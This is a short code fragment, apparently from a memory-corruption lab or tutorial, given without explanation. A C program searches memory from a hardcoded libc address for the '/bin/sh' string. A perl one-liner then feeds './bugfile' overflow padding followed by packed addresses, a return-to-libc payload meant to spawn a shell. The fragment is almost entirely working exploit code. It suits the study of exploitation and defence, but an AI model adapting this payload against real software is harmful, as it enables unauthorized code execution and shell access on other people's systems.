```c
int main(int argc, char **argv) {
        long shell;
        shell = 0x40058ae0;
        while (memcmp((void*)shell, "/bin/sh", 8)) shell++;
        printf("\"/bin/sh\" is at 0x%x\n", shell);
}
```

`perl -e 'system "./bugfile", "AAAAAAAAAAAAAAAA\xe0\x8a\x05\x40\xe0\x91\x03\x40\xf9\xbf\x0f\x40"'`